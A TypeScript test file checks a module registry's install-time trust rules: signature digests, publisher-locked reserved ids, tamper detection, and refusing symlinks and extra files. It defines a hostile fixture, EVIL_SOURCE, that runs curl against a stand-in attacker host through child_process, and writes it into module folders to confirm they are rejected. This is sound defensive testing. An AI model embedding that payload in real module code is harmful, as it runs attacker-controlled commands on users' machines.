import assert from 'node:assert/strict'
import { cpSync, existsSync, readdirSync, readFileSync } from 'fs'
import { mkdir, mkdtemp, rm, symlink, writeFile } from 'fs/promises'
import { tmpdir } from 'os'
import { join } from 'path'

import { createHash, generateKeyPairSync, sign } from 'node:crypto'

import { test } from 'vitest'

import { canonicalManifestPayload, validateThirdPartyModuleManifest } from '../../shared/modules/third-party-manifest'
import { findMarketplaceResourcePath } from '../marketplace/resources'
import { readTrustedMarketplacePublisherFingerprintsSync } from '../marketplace/trusted-publishers'
import {
  computeModuleFileDigestsSync,
  manifestFingerprint,
  moduleContentFingerprintSync,
  type ModuleTrustContext,
} from './module-signature'
import { discoverUserModules, discoverUserModulesSync, installModuleFolder } from './user-module-registry'

const EMPTY_TRUST: ModuleTrustContext = { trustedModules: new Map() }
const MAIN_SOURCE = 'exports.registerMain = () => {}\n'
const EVIL_SOURCE = "exports.registerMain = () => require('child_process').exec('curl https://evil.example')\n"

function manifestJson(overrides: Record<string, unknown> = {}): string {
  return JSON.stringify({
    id: 'demo',
    displayName: 'Demo module',
    version: 1,
    summary: 'A demo.',
    permissions: ['network'],
    ...overrides,
  })
}

async function withTempDir<T>(fn: (dir: string) => Promise<T>): Promise<T> {
  const dir = await mkdtemp(join(tmpdir(), 'mc-modules-'))
  try {
    return await fn(dir)
  } finally {
    await rm(dir, { recursive: true, force: true })
  }
}

async function writeModuleFolder(parent: string, folderName: string, json: string): Promise<string> {
  const dir = join(parent, folderName)
  await mkdir(dir, { recursive: true })
  await writeFile(join(dir, 'manifest.json'), json)
  return dir
}

type Signer = { fingerprint: string; signJson: (manifest: Record<string, unknown>) => string }

// Sign a validated manifest with a fresh ed25519 key. `fingerprint` is the
// signer's key fingerprint (sha256 of the DER public key — matching
// module-signature's publicKeyFingerprint).
function newSigner(): Signer {
  const { publicKey, privateKey } = generateKeyPairSync('ed25519')
  const publicKeyDer = publicKey.export({ type: 'spki', format: 'der' })
  return {
    fingerprint: createHash('sha256').update(publicKeyDer).digest('hex'),
    signJson: (manifest) => {
      const validated = validateThirdPartyModuleManifest(manifest)
      assert.equal(validated.ok, true)
      if (!validated.ok) throw new Error('test manifest invalid')
      const signature = {
        algorithm: 'ed25519' as const,
        publicKey: publicKeyDer.toString('base64'),
        signature: sign(null, Buffer.from(canonicalManifestPayload(validated.manifest), 'utf8'), privateKey).toString(
          'base64',
        ),
      }
      return JSON.stringify({ ...validated.manifest, signature })
    },
  }
}

function keyTrust(signer: Signer): ModuleTrustContext {
  return { trustedModules: new Map(), trustedKeyFingerprints: new Set([signer.fingerprint]) }
}

// A module folder with dist/main.cjs, its manifest signed the way
// `sprintengine-module sign` signs it: over the digests of the folder's files.
async function writeSignedModule(
  parent: string,
  folderName: string,
  signer: Signer,
  overrides: Record<string, unknown> = {},
): Promise<string> {
  const dir = join(parent, folderName)
  await mkdir(join(dir, 'dist'), { recursive: true })
  await writeFile(join(dir, 'dist', 'main.cjs'), MAIN_SOURCE)
  const files = computeModuleFileDigestsSync(dir).files
  const manifest = { ...JSON.parse(manifestJson({ entry: { main: 'dist/main.cjs' } })), ...overrides, files }
  await writeFile(join(dir, 'manifest.json'), signer.signJson(manifest))
  return dir
}

test('an unsigned module installs untrusted and is discovered', async () => {
  await withTempDir(async (dir) => {
    const src = await writeModuleFolder(dir, 'anything', manifestJson({ id: 'demo' }))
    const root = join(dir, 'modules')

    const install = await installModuleFolder(src, root, EMPTY_TRUST)
    assert.equal(install.ok, true)
    if (install.ok) {
      assert.equal(install.id, 'demo')
      assert.equal(install.trust.status, 'unsigned', 'a fresh unsigned module is untrusted')
    }

    const listed = await discoverUserModules(root, EMPTY_TRUST)
    assert.deepEqual(
      listed.modules.map((m) => m.manifest.id),
      ['demo'],
    )
    assert.equal(listed.modules[0].trust.status, 'unsigned')
    assert.equal(listed.modules[0].manifest.source, 'third-party')
    assert.equal(listed.rejected.length, 0)

    const syncListed = discoverUserModulesSync(root, EMPTY_TRUST)
    assert.deepEqual(
      syncListed.modules.map((m) => m.manifest.id),
      ['demo'],
    )
    assert.equal(syncListed.modules[0].trust.status, 'unsigned')
    assert.equal(syncListed.rejected.length, 0)
  })
})

// G8: a re-install REPLACES the folder. A file the previous version shipped and
// this one does not is gone afterwards — it used to survive `cp --force` and
// keep loading under a trust grant bound to a manifest that never covered it.
test('a reinstall replaces the folder rather than merging into it', async () => {
  await withTempDir(async (dir) => {
    const root = join(dir, 'modules')

    const first = await writeModuleFolder(dir, 'v1', manifestJson({ version: 1 }))
    await mkdir(join(first, 'dist'), { recursive: true })
    await writeFile(join(first, 'dist', 'renderer.mjs'), 'export const old = 1')
    await writeFile(join(first, 'leftover.txt'), 'stale')
    assert.equal((await installModuleFolder(first, root, EMPTY_TRUST)).ok, true)
    assert.equal(existsSync(join(root, 'demo', 'leftover.txt')), true)

    const second = await writeModuleFolder(dir, 'v2', manifestJson({ version: 2 }))
    await mkdir(join(second, 'dist'), { recursive: true })
    await writeFile(join(second, 'dist', 'main.cjs'), MAIN_SOURCE)
    const reinstall = await installModuleFolder(second, root, EMPTY_TRUST)
    assert.equal(reinstall.ok, true)

    assert.equal(existsSync(join(root, 'demo', 'dist', 'main.cjs')), true, 'the new files are there')
    assert.equal(existsSync(join(root, 'demo', 'leftover.txt')), false, 'a file the new version does not ship is gone')
    assert.equal(existsSync(join(root, 'demo', 'dist', 'renderer.mjs')), false, 'and so is a stale entry bundle')

    // The install staging folder never survives, and never shows up as a module.
    const listed = await discoverUserModules(root, EMPTY_TRUST)
    assert.deepEqual(
      listed.modules.map((entry) => entry.manifest.id),
      ['demo'],
    )
    assert.deepEqual(listed.rejected, [])
    assert.deepEqual(
      readdirSync(root).filter((name) => name.startsWith('.')),
      [],
    )
  })
})

test('a grant trusts the manifest and code it was given for, and nothing else', async () => {
  await withTempDir(async (dir) => {
    const root = join(dir, 'modules')
    const moduleRoot = join(root, 'demo')
    await mkdir(moduleRoot, { recursive: true })
    await writeFile(join(moduleRoot, 'main.cjs'), MAIN_SOURCE)
    const files = computeModuleFileDigestsSync(moduleRoot).files
    await writeFile(join(moduleRoot, 'manifest.json'), manifestJson({ entry: { main: 'main.cjs' }, files }))
    const discovered = await discoverUserModules(root, EMPTY_TRUST)
    const granted: ModuleTrustContext = {
      trustedModules: new Map([['demo', manifestFingerprint(discovered.modules[0].manifest)]]),
    }
    assert.equal((await discoverUserModules(root, granted)).modules[0].trust.status, 'trusted')
    // A stale/wrong fingerprint does not trust.
    const stale = await discoverUserModules(root, { trustedModules: new Map([['demo', 'deadbeef']]) })
    assert.equal(stale.modules[0].trust.status, 'unsigned')
    // Swapping the code under the unchanged manifest voids the grant.
    await writeFile(join(moduleRoot, 'main.cjs'), EVIL_SOURCE)
    const swapped = (await discoverUserModules(root, granted)).modules[0].trust
    assert.equal(swapped.status, 'invalid')
    assert.equal(swapped.tampered, true)
  })
})

test('a grant for a module whose manifest lists no files trusts nothing', async () => {
  await withTempDir(async (dir) => {
    const root = join(dir, 'modules')
    const moduleRoot = await writeModuleFolder(root, 'demo', manifestJson({ entry: { main: 'main.cjs' } }))
    await writeFile(join(moduleRoot, 'main.cjs'), MAIN_SOURCE)
    const discovered = await discoverUserModules(root, EMPTY_TRUST)
    const content = moduleContentFingerprintSync(discovered.modules[0].manifest, moduleRoot)
    assert.ok(content.ok)
    for (const fingerprint of [manifestFingerprint(discovered.modules[0].manifest), content.fingerprint]) {
      const listed = await discoverUserModules(root, { trustedModules: new Map([['demo', fingerprint]]) })
      assert.equal(listed.modules[0].trust.status, 'unsigned')
    }
  })
})

test('the install result carries the content fingerprint a grant binds to', async () => {
  await withTempDir(async (dir) => {
    const signer = newSigner()
    const src = await writeSignedModule(dir, 'src', signer)
    const install = await installModuleFolder(src, join(dir, 'modules'), EMPTY_TRUST)
    assert.equal(install.ok, true)
    if (!install.ok) return
    assert.equal(install.trust.status, 'signed')
    // With matching signed digests the content fingerprint IS the manifest's.
    const listed = await discoverUserModules(join(dir, 'modules'), EMPTY_TRUST)
    assert.equal(install.manifestFp, manifestFingerprint(listed.modules[0].manifest))
  })
})

test('a reserved id is refused without a first-party signature', async () => {
  await withTempDir(async (dir) => {
    const src = await writeModuleFolder(dir, 'git', manifestJson({ id: 'git' }))
    const install = await installModuleFolder(src, join(dir, 'modules'), EMPTY_TRUST)
    assert.equal(install.ok, false, 'cannot install a module that shadows a built-in id')
    if (!install.ok) assert.match(install.message, /publisher-locked/)
  })
})

// Publisher-locked reserved ids: the same reserved id installs and discovers
// when signed by a first-party marketplace publisher key over its code, and
// stays rejected for any other signer — including one the user id-trusted.
test('a reserved id is publisher-locked to the first-party key', async () => {
  await withTempDir(async (dir) => {
    const firstParty = newSigner()
    const root = join(dir, 'modules')

    const src = await writeSignedModule(dir, 'switchboard-src', firstParty, {
      id: 'switchboard',
      displayName: 'Switchboard',
    })
    const install = await installModuleFolder(src, root, keyTrust(firstParty))
    assert.equal(install.ok, true, 'first-party-signed module may claim its reserved id')
    if (install.ok) assert.equal(install.trust.status, 'trusted')
    const listed = await discoverUserModules(root, keyTrust(firstParty))
    assert.deepEqual(
      listed.modules.map((entry) => entry.manifest.id),
      ['switchboard'],
    )

    // A different signer is rejected even though its signature is valid —
    // and even if the user id-trusted that exact content.
    const impostorSrc = await writeSignedModule(dir, 'design-src', newSigner(), {
      id: 'design',
      displayName: 'Fake Design',
    })
    const impostorContent = moduleContentFingerprintSync(
      JSON.parse(readFileSync(join(impostorSrc, 'manifest.json'), 'utf8')),
      impostorSrc,
    )
    assert.ok(impostorContent.ok)
    const blocked = await installModuleFolder(impostorSrc, root, {
      trustedModules: new Map([['design', impostorContent.fingerprint]]),
      trustedKeyFingerprints: new Set([firstParty.fingerprint]),
    })
    assert.equal(blocked.ok, false, 'wrong signer cannot claim a reserved id')
    if (!blocked.ok) assert.match(blocked.message, /publisher-locked/)
  })
})

// The attack this guards: the first-party review manifest is public and
// validly signed, but signs no digests. Copied next to code of anybody's
// choosing and handed over as a module folder, it must not install as the
// trusted first-party module.
test('a first-party manifest copied next to other code is not installed from a folder', async () => {
  await withTempDir(async (dir) => {
    const manifestPath = findMarketplaceResourcePath('plugins/review/module/manifest.json')
    assert.ok(manifestPath)
    const src = join(dir, 'review-lookalike')
    await mkdir(join(src, 'dist'), { recursive: true })
    cpSync(manifestPath, join(src, 'manifest.json'))
    await writeFile(join(src, 'dist', 'main.cjs'), EVIL_SOURCE)
    await writeFile(join(src, 'dist', 'renderer.mjs'), 'export {}\n')
    const root = join(dir, 'modules')
    const ctx: ModuleTrustContext = {
      trustedModules: new Map(),
      trustedKeyFingerprints: readTrustedMarketplacePublisherFingerprintsSync({ isPackaged: true }),
    }

    const install = await installModuleFolder(src, root, ctx)
    assert.equal(install.ok, false)
    if (install.ok) return
    assert.match(install.message, /publisher-locked/)
    assert.ok(install.rejected.issues.some((issue) => /lists no digests of its code/.test(issue.message)))
    assert.equal(existsSync(join(root, 'review')), false, 'nothing was installed')

    // Dropped straight into the module root instead, discovery refuses it too.
    cpSync(src, join(root, 'review'), { recursive: true })
    const listed = await discoverUserModules(root, ctx)
    assert.deepEqual(listed.modules, [])
    assert.match(listed.rejected[0]?.issues[0]?.message ?? '', /publisher-locked/)
  })
})

test('a signed manifest without files from a trusted key installs, but not as trusted', async () => {
  await withTempDir(async (dir) => {
    const signer = newSigner()
    const src = await writeModuleFolder(dir, 'src', signer.signJson(JSON.parse(manifestJson())))
    await writeFile(join(src, 'main.cjs'), MAIN_SOURCE)
    const install = await installModuleFolder(src, join(dir, 'modules'), keyTrust(signer))
    assert.equal(install.ok, true)
    if (install.ok) assert.equal(install.trust.status, 'signed', 'the key does not vouch for code it never signed')
  })
})

test('a signed manifest whose files match installs trusted', async () => {
  await withTempDir(async (dir) => {
    const signer = newSigner()
    const src = await writeSignedModule(dir, 'src', signer)
    const install = await installModuleFolder(src, join(dir, 'modules'), keyTrust(signer))
    assert.equal(install.ok, true)
    if (!install.ok) return
    assert.equal(install.trust.status, 'trusted')
    const listed = await discoverUserModules(join(dir, 'modules'), keyTrust(signer))
    assert.equal(listed.modules[0].trust.status, 'trusted')
    assert.equal(listed.modules[0].trust.via, 'publisher')
  })
})

test('a modified code file is refused as tampered', async () => {
  await withTempDir(async (dir) => {
    const signer = newSigner()
    const src = await writeSignedModule(dir, 'src', signer)
    await writeFile(join(src, 'dist', 'main.cjs'), EVIL_SOURCE)
    const install = await installModuleFolder(src, join(dir, 'modules'), keyTrust(signer))
    assert.equal(install.ok, false)
    if (install.ok) return
    assert.match(install.message, /tampered/)
    assert.deepEqual(install.rejected.issues, [
      { path: 'files.dist/main.cjs', message: 'does not match the signed digests.' },
    ])
    assert.equal(existsSync(join(dir, 'modules', 'demo')), false)
  })
})

test('an extra file the signed digests do not list is refused', async () => {
  await withTempDir(async (dir) => {
    const signer = newSigner()
    const src = await writeSignedModule(dir, 'src', signer)
    await writeFile(join(src, 'dist', 'extra.cjs'), EVIL_SOURCE)
    const install = await installModuleFolder(src, join(dir, 'modules'), keyTrust(signer))
    assert.equal(install.ok, false)
    if (install.ok) return
    assert.deepEqual(install.rejected.issues, [
      { path: 'files.dist/extra.cjs', message: 'is not listed in the signed digests.' },
    ])
  })
})

test('a symlink in the module folder is refused', async () => {
  await withTempDir(async (dir) => {
    const signer = newSigner()
    const src = await writeSignedModule(dir, 'src', signer)
    await writeFile(join(dir, 'outside.cjs'), EVIL_SOURCE)
    await rm(join(src, 'dist', 'main.cjs'))
    await symlink(join(dir, 'outside.cjs'), join(src, 'dist', 'main.cjs'))
    const install = await installModuleFolder(src, join(dir, 'modules'), keyTrust(signer))
    assert.equal(install.ok, false)
    if (install.ok) return
    assert.ok(install.rejected.issues.some((issue) => /symbolic link/.test(issue.message)))

    // Unsigned, the same folder is refused too: nothing could ever trust it.
    const unsigned = await writeModuleFolder(dir, 'unsigned', manifestJson())
    await symlink(join(dir, 'outside.cjs'), join(unsigned, 'main.cjs'))
    const unsignedInstall = await installModuleFolder(unsigned, join(dir, 'modules'), EMPTY_TRUST)
    assert.equal(unsignedInstall.ok, false)
    if (!unsignedInstall.ok) assert.match(unsignedInstall.message, /files a module cannot ship/)
  })
})

test('a folder carrying .git or node_modules is refused with a pointer to pack', async () => {
  await withTempDir(async (dir) => {
    const src = await writeModuleFolder(dir, 'src', manifestJson())
    await mkdir(join(src, '.git'), { recursive: true })
    await writeFile(join(src, '.git', 'HEAD'), 'ref: refs/heads/main\n')
    const install = await installModuleFolder(src, join(dir, 'modules'), EMPTY_TRUST)
    assert.equal(install.ok, false)
    if (!install.ok) assert.match(install.message, /sprintengine-module pack/)
  })
})

test('a module whose folder name differs from its id is rejected', async () => {
  await withTempDir(async (dir) => {
    const root = join(dir, 'modules')
    await writeModuleFolder(root, 'wrong', manifestJson({ id: 'demo' }))
    const listed = await discoverUserModules(root, EMPTY_TRUST)
    assert.deepEqual(listed.modules, [])
    assert.equal(listed.rejected.length, 1)
    assert.match(listed.rejected[0].issues[0].message, /must match its folder name/)
  })
})

test('an unparseable manifest is rejected', async () => {
  await withTempDir(async (dir) => {
    const root = join(dir, 'modules')
    await writeModuleFolder(root, 'broken', '{ not json')
    const listed = await discoverUserModules(root, EMPTY_TRUST)
    assert.deepEqual(listed.modules, [])
    assert.equal(listed.rejected.length, 1)
  })
})
